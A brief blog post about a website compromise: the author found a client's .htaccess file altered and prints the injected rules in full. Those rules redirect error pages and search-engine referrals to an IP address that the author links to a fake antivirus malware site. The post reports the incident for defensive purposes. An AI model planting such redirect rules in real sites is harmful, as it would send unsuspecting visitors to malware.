---
layout: post
title: ".htaccess hacked"
custom_v2_id: 50
---

<p>Today a client called me telling me that its website was unavailable, or more exactly that the full content of the FTP was displayed instead of its homepage.</p>
<p>After a little investigation it appears that the .htaccess file had been modified, here was the content I found :</p>
<pre>RewriteEngine On<br />ErrorDocument 400 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 401 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 403 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 404 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 500 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />RewriteCond %{HTTP_REFERER} .*google.* [OR]<br />RewriteCond %{HTTP_REFERER} .*ask.* [OR]<br />RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]<br />RewriteCond %{HTTP_REFERER} .*excite.* [OR]<br />RewriteCond %{HTTP_REFERER} .*altavista.* [OR]<br />RewriteCond %{HTTP_REFERER} .*msn.* [OR]<br />RewriteCond %{HTTP_REFERER} .*netscape.* [OR]<br />RewriteCond %{HTTP_REFERER} .*aol.* [OR]<br />RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]<br />RewriteCond %{HTTP_REFERER} .*goto.* [OR]<br />RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]<br />RewriteCond %{HTTP_REFERER} .*mamma.* [OR]<br />RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]<br />RewriteCond %{HTTP_REFERER} .*lycos.* [OR]<br />RewriteCond %{HTTP_REFERER} .*search.* [OR]<br />RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]<br />RewriteCond %{HTTP_REFERER} .*bing.* [OR]<br />RewriteCond %{HTTP_REFERER} .*dogpile.*<br />RewriteRule ^(.*)$ http://217.23.5.232/hitin.php?land=20&amp;affid=20116 [R=301,L]</pre>
<p>A little search online told me that this IP refer to a malware website launching a fake Antivirus software installation.</p>
<p>I have no idea how the .htaccess got modified, but I changed the FTP password.</p>